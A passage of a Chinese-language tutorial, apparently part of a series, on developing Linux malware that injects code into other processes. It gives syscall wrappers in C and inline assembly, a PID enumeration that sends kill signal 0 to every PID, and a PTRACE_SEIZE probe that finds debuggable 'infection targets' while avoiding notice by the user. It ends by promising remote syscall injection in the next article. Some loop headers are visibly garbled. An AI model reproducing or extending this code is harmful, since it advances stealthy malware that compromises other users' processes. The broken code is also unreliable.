    }
它允许定义以下宏：
    #define puts(string) write(1, string, strlen(string))
它提供了一种在标准输出中显示调试消息的简单方法：
    void
    persist(void)
    {
      puts("This is persist()n");
    }
    void
    propagate(void)
    {
      puts("This is propagate()n");
    }
运行后应该产生以下输出：
    % ./spawn injectable.so persist
    Symbol `persist' found in 0x7f3eb58403be. Jumping to function...
    This is persist()
    Function returned!
    % ./spawn injectable.so propagate
    Symbol `propagate' found in 0x7fb8874403db. Jumping to function...
    This is propagate()
    Function returned!
第一个困难解决，从现在开始，对于任何缺少的系统调用功能，都应该实现相应的C
wrapper，所需的库函数(如strlen)应该按照我们需要的相应的标准头原型来实现。
## 枚举过程
为了在其他进程中注入恶意代码，第一步是了解系统中可用的进程。有两种方法可以做到这一点：
  * 访问/proc并列出所有文件夹，或者
  * 检测所有系统PID，从PID 2到给定的PID_MAX
虽然第一种方法看起来是最快的，但它也是最复杂的，因为：
  * /proc可能没有安装。
  * Linux缺少处理文件夹的opendir/readdir系统调用。它实际上依赖于getdents，它返回一个需要手动处理的可变大小结构的buffer。
  * 文件名必须手动转换为整数，以便提取它们所引用的PID。因为我们无法访问库函数，所以这种转换特性也应该手动实现。
虽然第二种方法看起来比较慢，但在现代操作系统中几乎都能正常工作。在这种方法中，在PID范围内通过信号0多次调用Kill，如果PID存在且调用进程可以向其发送信号(这反过来与调用进程的权限有关)，则返回0，否则将返回错误代码。
现在唯一未知的是`PID_MAX`，它在每个系统不一定都是相同的。幸运的是，在绝大多数情况下，`PID_MAX`被设置为默认值(32768)。由于在没有发送信号的情况下，kill是非常快的，所以调用kill
33000次似乎是可行的。
使用这种技术，需要一个用于kill的wrapper。遍历2到32768之间的所有可能的PID(因为PID
1是为init保留的)，并为找到的每个进程打印一条消息：
    int
    kill(pid_t pid, int sig)
    {
      int result;
      asm volatile("syscall" : "=a" (result) : "a" (__NR_kill), "D" (pid), "S" (sig));
      return result;
    }
编写一个函数，打印十进制数字：
    void
    puti(unsigned int num)
    {
      unsigned int max = 1000000000;
      char c;
      unsigned int msd_found = 0;
      while (max > 0) {
        c = '0' + num / max;
        msd_found |= c != '0' || max == 1;
        if (msd_found)
          write(1, &c, 1);
        num %= max;
        max /= 10;
      }
    }
现在剩下的工作是修改propagate()，用来进行枚举：
    void
    propagate(void)
    {
      pid_t pid;
      for (pid = 2; pid = 0) {
          puts("Process found: ");
          puti(pid);
          puts("n");
        }
    }
编译后，预期得到这样的结果：
    % ./spawn injectable.so propagate
    Process found: 1159
    Process found: 1160
    Process found: 1166
    Process found: 1167
    Process found: 1176
    Process found: 1324
    Process found: 1328
    Process found: 1352
对于常规的桌面GNU/Linux发行版来说，通常会发现超过100个用户进程。这相当于说有一百多个可能的感染目标。
## 尝试PTRACE_SEIZE
这种技术的主要缺点：由于访问限制(例如setuid进程)，无法对上面列举的一些进程进行调试。对每个已发现进程的ptrace调用(PTRACE_SEIZE)都可以用于标识哪些进程是可调试的。
虽然对于调试运行中的程序，首先想到的是使用`PTRACE_ATTACH`，但是这种技术有副作用：如果成功，它将停止调试，直到使用`PTRACE_CONT`恢复调试为止。这可能会影响目标进程(特别是当它对时间敏感时)，从而被用户发现。但是`PTRACE_SEIZE`(在Linux3.4中引入)并不会停止目标进程。
根据libc，ptrace是一个可变的函数，因此通过始终接受4个参数、填充参数或不根据请求的命令填充参数，可以很方便地简化wrapper：
    long
    ptrace4(int request, pid_t pid, void *addr, void *data)
    {
      long result;
      register void* r10 asm("r10") = data;
      asm volatile("syscall" : "=a" (result) : "a" (__NR_ptrace), "S" (pid), "D" (request), "d" (addr));
      return result;
    }
现在propagate函数如下：
    void
    propagate(void)
    {
      pid_t pid;
      int err;
      for (pid = 2; pid = 0) {
          puts("Process found: ");
          puti(pid);
          puts(": ");
          if ((err = ptrace4(PTRACE_SEIZE, pid, NULL, NULL)) >= 0) {
            puts("seizable!n");
            ptrace4(PTRACE_DETACH, pid, NULL, NULL);
          } else {
            puts("but cannot be debugged  [errno=");
            puti(-err);
            puts("]n");
          }
        }
    }
它将列出系统上所有可调试的进程。
## 结论
前面的测试让我们快速地了解了这种技术的可行性。到这一步，已经接近普通的调试器了，最大区别是我们的代码是自动运行的。在下一篇文章中，我们将介绍如何捕获调试器的系统来远程注入系统调用。这些远程系统调用将用于创建生成注入线程的代码和数据页。